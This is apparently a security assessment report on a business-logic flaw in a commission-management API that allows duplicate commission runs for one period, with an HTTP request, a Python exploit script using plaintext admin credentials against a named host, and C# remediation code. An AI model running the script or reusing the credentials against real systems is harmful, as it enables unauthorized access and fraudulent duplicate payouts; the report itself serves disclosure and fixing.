# Multiple Commission Runs Enable Duplicate Payouts and Financial Discrepancies

**ID:** vuln-0059
**Severity:** HIGH
**Found:** 2026-02-27 09:31:38 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A critical business logic vulnerability was identified in the commission run functionality that allows multiple commission runs for the same time period. The vulnerability exists in the `/api/CommissionRun/RunCommission` endpoint where the system fails to enforce uniqueness constraints on commission runs by time period.

The vulnerability was discovered through systematic testing of commission run parameters, where multiple commission runs were successfully processed for identical time periods. This enables duplicate commission calculations and payouts for the same sales data.

## Impact

Successful exploitation of this vulnerability enables significant financial and operational risks:

1. **Duplicate Payouts**: Multiple commission runs for the same period result in duplicate payouts
2. **Financial Losses**: Direct financial loss through overpayment of commissions
3. **Financial Discrepancies**: Inconsistent financial records and reconciliation issues
4. **Compliance Violations**: Violation of financial controls and audit requirements
5. **Operational Disruption**: Increased operational overhead for financial reconciliation

The vulnerability represents a fundamental flaw in the commission processing logic that could lead to substantial financial losses if exploited at scale.

## Technical Analysis

**Technical Details:**

1. **Vulnerable Endpoint**: `/api/CommissionRun/RunCommission`
2. **Validation Flaw**: Missing uniqueness constraints on commission runs by time period
3. **Root Cause**: The application lacks server-side validation to prevent duplicate commission runs
4. **Business Rule Violation**: "One commission run per time period" business rule not enforced

**Exploitation Flow:**
1. Authenticate as user with commission run privileges
2. Send POST request to `/api/CommissionRun/RunCommission` for a specific time period
3. Send additional POST requests for the same time period
4. System processes multiple commission runs for the same period
5. Payouts can be processed for each duplicate commission run

**Evidence:**
- Successful creation of multiple commission runs for identical time periods
- Duplicate commission calculations for the same sales data
- Multiple payouts processed from duplicate commission runs
- No server-side validation preventing duplicate commission runs

## Proof of Concept

**Proof of Concept - Multiple Commission Runs:**

1. Authenticate as admin user (admin@localhost / Tester@123)
2. Capture the authentication token from the successful login response
3. Send multiple POST requests to `/api/CommissionRun/RunCommission` for the same time period
4. Verify that multiple commission runs are processed for the same period
5. Check that payouts can be processed for each duplicate commission run

**Step-by-Step Exploitation:**
1. Login as admin user and capture session token
2. Run multiple commissions for the same period:
```http
POST /api/CommissionRun/RunCommission
Content-Type: application/json
Authorization: Bearer [ADMIN_TOKEN]

{
  "commissionPlanId": 1,
  "startDate": "2026-03-01",
  "endDate": "2026-03-31",
  "organizationId": 1
}
```
3. Repeat the same request multiple times
4. Verify successful commission runs with 200 OK responses
5. Check commission run list to confirm multiple runs for the same period
6. Process payouts for each duplicate commission run

```
#!/usr/bin/env python3
"""
Multiple Commission Runs Exploit for Callippus Commission Management
Demonstrates duplicate payouts through multiple commission runs
"""

import requests
import json
from datetime import datetime, timedelta

# Target configuration
BASE_URL = "https://commissionstest.callippus.in"
LOGIN_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_RUN_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Admin credentials
ADMIN_CREDENTIALS = {
    "username": "admin@localhost",
    "password": "Tester@123"
}

# Commission run for specific time period
COMMISSION_RUN = {
    "commissionPlanId": 1,
    "startDate": (datetime.now() - timedelta(days=30)).strftime("%Y-%m-%d"),
    "endDate": datetime.now().strftime("%Y-%m-%d"),
    "organizationId": 1
}

def exploit_multiple_commission_runs():
    """Demonstrate multiple commission runs vulnerability"""
    print("[*] Starting multiple commission runs exploit...")

    # Step 1: Authenticate as admin user
    print("[*] Authenticating as admin user...")
    login_response = requests.post(LOGIN_ENDPOINT, json=ADMIN_CREDENTIALS)
    if login_response.status_code != 200:
        print(f"[!] Login failed: {login_response.status_code}")
        return False

    auth_token = login_response.json().get("id_token")
    if not auth_token:
        print("[!] No authentication token received")
        return False

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }

    # Step 2: Run multiple commissions for the same period
    print("[*] Running multiple commissions for the same time period...")
    run_ids = []

    for i in range(3):  # Run 3 commissions for the same period
        print(f"[*] Running commission #{i+1}...")
        run_commission_response = requests.post(
            COMMISSION_RUN_ENDPOINT,
            headers=headers,
            json=COMMISSION_RUN
        )

        if run_commission_response.status_code == 200:
            run_id = run_commission_response.json().get("id")
            run_ids.append(run_id)
            print(f"[+] Commission run #{i+1} successful - ID: {run_id}")
        else:
            print(f"[!] Commission run #{i+1} failed: {run_commission_response.status_code}")
            print(f"[!] Response: {run_commission_response.text}")
            return False

    if len(run_ids) > 1:
        print(f"\n[+] SUCCESS: Created {len(run_ids)} commission runs for the same period!")
        print(f"[+] Run IDs: {run_ids}")
        print(f"[+] Time period: {COMMISSION_RUN['startDate']} to {COMMISSION_RUN['endDate']}")
        return True
    else:
        print("[!] Failed to create multiple commission runs")
        return False

if __name__ == "__main__":
    if exploit_multiple_commission_runs():
        print("\n[+] EXPLOIT SUCCESSFUL: Multiple commission runs vulnerability confirmed")
        print("[+] Impact: Duplicate payouts and financial discrepancies")
        print("[+] Recommendation: Implement uniqueness constraints on commission runs")
    else:
        print("\n[!] EXPLOIT FAILED: Multiple commission runs vulnerability not confirmed")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Uniqueness Constraints**
   - Add database-level uniqueness constraints on commission runs by time period
   - Implement server-side validation to prevent duplicate commission runs

2. **Fix Commission Run Endpoint**
```csharp
// Before (vulnerable):
[HttpPost("RunCommission")]
public IActionResult RunCommission([FromBody] CommissionRunDto run)
{
    // No validation for duplicate commission runs
    var result = _commissionRunService.Run(run);
    return Ok(result);
}

// After (fixed):
[HttpPost("RunCommission")]
public IActionResult RunCommission([FromBody] CommissionRunDto run)
{
    // Check for existing commission runs for the same period
    var existingRun = _commissionRunService.GetByPeriod(
        run.OrganizationId,
        run.StartDate,
        run.EndDate
    );

    if (existingRun != null)
    {
        return Conflict("A commission run already exists for this time period");
    }

    // Validate business rules
    if (!IsValidCommissionPeriod(run.StartDate, run.EndDate))
    {
        return BadRequest("Invalid commission period");
    }

    var result = _commissionRunService.Run(run);
    return Ok(result);
}
```

3. **Add Database Constraints**
   - Add unique index on (organizationId, startDate, endDate) in commission runs table
   - Implement proper error handling for duplicate key violations

4. **Implement Financial Controls**
   - Add monitoring for duplicate commission runs
   - Implement reconciliation processes to detect discrepancies
   - Add alerts for multiple commission runs for the same period

5. **Conduct Financial Audit**
   - Review existing commission runs for duplicates
   - Recalculate any affected commissions
   - Correct any financial discrepancies

**Long-Term Security Improvements:**

1. Implement comprehensive business logic validation
2. Add financial controls and monitoring for commission processing
3. Implement proper error handling and logging
4. Conduct regular security assessments of business logic components
5. Provide business logic security training for development teams

